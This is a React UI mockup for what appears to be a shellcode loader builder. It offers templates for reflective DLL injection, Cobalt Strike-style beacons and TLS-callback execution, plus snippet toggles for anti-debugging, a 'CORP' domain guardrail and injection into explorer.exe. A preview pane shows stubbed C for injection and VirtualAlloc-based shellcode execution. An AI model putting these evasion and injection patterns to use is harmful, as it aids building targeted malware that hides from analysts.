/* Frame 03 — Template & Snippets */

function FrameTemplate() {
  return (
    <Shell crumbs={["build", "template"]} pipeActive="tpl"
      pipeStates={{ src: "done", sgn: "done", enc: "done", tpl: "active" }}
      status={[
        { icon: "info", k: "template", v: "full-loader" },
        { icon: "info", k: "snippets", v: "5 selected" },
      ]}>
      <div className="cfg">
        <div style={{ display: "flex", alignItems: "baseline", gap: 14, marginBottom: 22 }}>
          <h1 className="h1">Template &amp; snippets</h1>
          <span className="sub">Composed at render time from <span className="mono" style={{ color: "var(--n-9)" }}>vx_api_snippets.yaml</span></span>
        </div>

        <Sec title="Playbook" action={<button className="btn ghost"><Icon name="dl" size={12} />Open in editor</button>}>
          <div className="card row" style={{ justifyContent: "space-between" }}>
            <div className="row" style={{ gap: 12 }}>
              <div style={{ width: 36, height: 36, borderRadius: 8, background: "var(--n-3)", display: "grid", placeItems: "center" }}>
                <Icon name="doc" size={16} />
              </div>
              <div>
                <div className="h2">vx_api_snippets.yaml</div>
                <div className="mono" style={{ fontSize: 11, color: "var(--n-7)" }}>89 snippets · 10 categories · 6 templates</div>
              </div>
            </div>
            <div className="row" style={{ gap: 8 }}>
              <select className="select" style={{ width: 220 }}><option>Assets/vx_api_snippets.yaml</option></select>
              <button className="btn"><Icon name="refresh" size={12} />Reload</button>
            </div>
          </div>
        </Sec>

        <Sec title="Template">
          <div className="card" style={{ padding: 0 }}>
            <TplRow name="full-loader" desc="All feature placeholders wired" selected />
            <TplRow name="minimal" desc="Shellcode source + one execution snippet" />
            <TplRow name="reflective" desc="Reflective DLL injection scaffold" />
            <TplRow name="staged-http" desc="HTTPS stager with cert-pin envelope" />
            <TplRow name="cobalt-compat" desc="Cobalt-strike beacon-shaped" />
            <TplRow name="tls-callback" desc="Pre-main execution via TLS callback" />
          </div>
        </Sec>

        <Sec title="Snippets" action={<div className="row" style={{ gap: 8 }}>
          <Chip kind="acc" dot>5 active</Chip>
          <button className="btn ghost"><Icon name="filter" size={12} />Filter</button>
        </div>}>
          <div className="card" style={{ padding: 0 }}>
            <SnipGroup name="Anti-debugging" template="ANTIDEBUGGING" stack
              items={[
                { name: "CloseHandle on invalid address", id: "CloseHandleAntiDebug", on: true, inputs: [] },
                { name: "IsDebuggerPresent", id: "IsDebuggerPresentCheck", on: true },
                { name: "NtQueryInformationProcess · ProcessDebugPort", id: "NtQueryDebugPort", on: false },
                { name: "RDTSC timing delta", id: "RdtscTiming", on: false },
              ]} />
            <SnipGroup name="Guardrail" template="GUARDRAIL"
              items={[
                { name: "Require environment variable", id: "EnvVarGuardrail", on: true,
                  input: { label: "Condition", value: "USERDOMAIN#equals#CORP" } },
                { name: "Require domain join", id: "DomainGuardrail", on: false },
              ]} />
            <SnipGroup name="Process injection" template="PSINJECTION"
              items={[
                { name: "WriteProcessMemory + CreateRemoteThread", id: "WPMCRT", on: true,
                  input: { label: "Target process", value: "explorer.exe" } },
                { name: "QueueUserAPC into ALERTABLE thread", id: "QueueAPC", on: false },
                { name: "Map → SetThreadContext (Ghosting)", id: "Ghost", on: false },
              ]} />
            <SnipGroup name="Shellcode execution" template="SHELLCODEEXECUTION"
              items={[
                { name: "VirtualAlloc + function pointer", id: "VirtualAllocFuncPtr", on: true },
                { name: "CreateThread", id: "CreateThreadExec", on: false },
                { name: "EnumWindows callback", id: "EnumWindowsExec", on: false },
              ]} />
          </div>
        </Sec>
      </div>

      <SnippetDiffPreview />
    </Shell>
  );
}

function TplRow({ name, desc, selected }) {
  return (
    <div className="list-item" style={{
      gridTemplateColumns: "20px 1fr auto auto", padding: "12px 16px",
      borderBottom: "1px solid var(--n-3)",
      ...(selected ? { background: "var(--acc-bg)", boxShadow: "inset 2px 0 0 var(--acc)" } : {}),
    }}>
      <div style={{
        width: 14, height: 14, borderRadius: "50%",
        border: "1px solid " + (selected ? "var(--acc)" : "var(--n-5)"),
        background: selected ? "var(--acc)" : "transparent",
        boxShadow: selected ? "inset 0 0 0 3px var(--n-3)" : "none",
      }} />
      <div>
        <div className="ttl mono" style={{ fontSize: 13 }}>{name}</div>
        <div style={{ fontSize: 11, color: "var(--n-7)", marginTop: 2 }}>{desc}</div>
      </div>
      <Chip>{name === "full-loader" ? "5 placeholders" : name === "minimal" ? "2 placeholders" : "4 placeholders"}</Chip>
      <Icon name="chev" size={12} />
    </div>
  );
}

function SnipGroup({ name, template, stack, items }) {
  const activeCount = items.filter(i => i.on).length;
  return (
    <div style={{ borderBottom: "1px solid var(--n-3)" }}>
      <div className="row" style={{ padding: "12px 16px", background: "var(--n-1)", gap: 10 }}>
        <Icon name="chev" size={11} sw={2} />
        <div>
          <div className="h2">{name}</div>
          <div className="mono" style={{ fontSize: 10, color: "var(--n-7)" }}>
            template: {template}{stack ? "  ·  allowMultiple" : ""}
          </div>
        </div>
        <div style={{ flex: 1 }} />
        {activeCount > 0 && <Chip kind="acc">{activeCount} active</Chip>}
      </div>
      <div style={{ padding: "6px 8px" }}>
        {items.map((it, i) => (
          <div key={i} className={"list-item" + (it.on ? " sel" : "")} style={{ gridTemplateColumns: "16px 1fr auto" }}>
            <div style={{
              width: 12, height: 12, borderRadius: 3,
              border: "1px solid " + (it.on ? "var(--acc)" : "var(--n-5)"),
              background: it.on ? "var(--acc)" : "transparent",
              display: "grid", placeItems: "center",
            }}>
              {it.on && <Icon name="check" size={9} sw={3} />}
            </div>
            <div>
              <div className="ttl">{it.name}</div>
              <div className="meta">id <span style={{ color: "var(--n-8)" }}>{it.id}</span></div>
              {it.input && it.on && (
                <div className="row" style={{ marginTop: 6, gap: 8 }}>
                  <span className="hint mono" style={{ fontSize: 10 }}>{it.input.label}</span>
                  <input className="input mono" style={{ padding: "4px 8px", fontSize: 11, width: 260 }} defaultValue={it.input.value} />
                </div>
              )}
            </div>
            <Icon name="more" size={12} />
          </div>
        ))}
      </div>
    </div>
  );
}

function SnippetDiffPreview() {
  return (
    <div className="preview">
      <div className="ptabs">
        <div className="ptab on"><Icon name="doc" size={11} />render diff</div>
        <div className="ptab"><Icon name="layers" size={11} />placeholders</div>
        <div className="ptab"><Icon name="doc" size={11} />yaml</div>
      </div>
      <div className="pbody">
        <div className="ppad" style={{ paddingBottom: 0 }}>
          <H3>What this composition expands into</H3>
        </div>
        <CodeBlock startLine={42} highlight={[]} lines={[
          [["cm", "// {{SNIPPET_INCLUDES}}"]],
          [["ins", "#include <intrin.h>"]],
          [["ins", "#include <tlhelp32.h>"]],
          [["", ""]],
          [["cm", "// {{SNIPPET_IMPLEMENTATIONS}}"]],
          [["ins", "static BOOL AntiDbg_CloseHandle() { /* ... */ }"]],
          [["ins", "static BOOL InjectWPMCRT(PBYTE, DWORD, DWORD) { /* ... */ }"]],
          [["ins", "static DWORD GetProcessOrThreadId(LPCWSTR, BOOL) { /* ... */ }"]],
          [["", ""]],
          [["cm", "// — in main() —"]],
          [["", ""]],
          [["cm", "// {{GUARDRAILS}}"]],
          [["ins", "if (GetEnvironmentVariableW(L\"USERDOMAIN\", buf, ...)"]],
          [["ins", "    || wcscmp(buf, L\"CORP\") != 0) return 0;"]],
          [["", ""]],
          [["cm", "// {{ANTI_DEBUGGING}}"]],
          [["ins", "if (AntiDbg_CloseHandle()) return 0;"]],
          [["ins", "if (IsDebuggerPresent()) return 0;"]],
          [["", ""]],
          [["cm", "// {{PROCESS_INJECTION}}"]],
          [["ins", "if (InjectWPMCRT((PBYTE)code_blob, dwSize,"]],
          [["ins", "    GetProcessOrThreadId(L\"explorer.exe\", true))) return 1;"]],
          [["", ""]],
          [["cm", "// {{SHELLCODE_EXECUTION}}"]],
          [["del", "// CreateThread((LPTHREAD_START_ROUTINE)mem, ...);"]],
          [["ins", "void* mem = VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_RW);"]],
          [["ins", "memcpy(mem, code_blob, dwSize); ((void(*)())mem)();"]],
        ]} />
      </div>
    </div>
  );
}

window.FrameTemplate = FrameTemplate;
